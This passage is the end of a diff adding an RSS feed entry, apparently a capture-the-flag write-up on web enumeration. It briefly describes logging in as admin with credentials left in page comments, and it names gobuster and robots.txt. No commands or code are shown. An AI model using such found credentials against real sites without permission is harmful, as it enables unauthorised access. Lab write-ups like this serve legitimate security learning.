+srcset="https://hushkat.github.io/p/web-enumeration/WebEnumeration6_hu15791100942695350022.jpg 480w, https://hushkat.github.io/p/web-enumeration/WebEnumeration6_hu5673465598561160528.jpg 1024w"
+loading="lazy"
+alt="adminpage inspection"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Using the credentials found in the comments, I successfully logged in as an admin user, which led me to a new page containing the flag for the challenge.&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>In conclusion, this challenge provided a great opportunity to apply web enumeration techniques to uncover hidden information and identify potential vulnerabilities. The process involved inspecting the underlying code, using gobuster for directory enumeration, understanding the significance of robots.txt files, and recognizing the importance of secure coding practices.&lt;/p>
+&lt;p>As a hacker, it&amp;rsquo;s crucial to continuously explore and learn new techniques. Happy hacking, and never stop learning!&lt;/p>
+&lt;p>dr0idbot out.&lt;/p></description></item></channel></rss>
